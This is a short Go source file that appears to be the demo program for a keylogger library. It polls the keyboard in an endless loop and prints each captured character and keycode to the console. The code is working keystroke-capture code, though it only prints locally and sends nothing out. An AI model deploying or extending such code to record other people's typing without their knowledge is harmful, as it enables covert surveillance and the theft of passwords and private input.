package main

import (
	"fmt"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()
	emptyCount := 0

	for {
		key := kl.GetKey()

		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
		}

		emptyCount++

		fmt.Printf("Empty count: %d\r", emptyCount)

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
